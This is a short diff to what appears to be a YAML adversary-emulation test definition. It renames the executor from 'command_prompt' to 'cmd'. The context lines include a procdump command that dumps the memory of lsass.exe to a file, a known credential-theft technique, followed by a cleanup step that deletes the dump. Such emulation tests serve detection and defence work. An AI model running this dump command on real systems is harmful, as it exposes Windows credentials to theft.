@@ -40,8 +40,8 @@ steps:
     - name: create-mini-dump-of-lsass.exe-using-procdump
       inline: |
         "{{.Args.procdump_exe}}" -accepteula -mm lsass.exe {{.Args.output_file}}
-      executor: command_prompt
+      executor: cmd
       cleanup:
         inline: |
             del "{{.Args.output_file}}" >nul 2> nul
-        executor: command_prompt
+        executor: cmd
